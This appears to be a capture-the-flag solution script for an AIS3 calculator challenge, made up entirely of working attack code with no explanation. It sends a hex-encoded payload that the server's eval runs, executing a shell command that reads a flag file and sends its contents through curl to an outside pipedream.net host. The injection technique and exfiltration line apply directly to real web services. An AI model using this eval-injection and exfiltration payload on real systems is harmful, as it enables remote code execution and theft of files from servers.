import requests
import subprocess

url = 'http://chals1.ais3.org:5001/calculate'
code = "__import__('os').system('curl https://eovapfb7jrllbkv.m.pipedream.net/$(cat ../flag)')"
hex_code = ''.join(hex(ord(c))[2:] for c in code)
print(hex_code)
payload = {"expression": "eval(bytes.fromhex('5f5f696d706f72745f5f28276f7327292e73797374656d28276375726c2068747470733a2f2f656f7661706662376a726c6c626b762e6d2e70697065647265616d2e6e65742f2428636174202e2e2f666c6167292729'))"}
response = requests.post(url, json=payload)

print(response.json())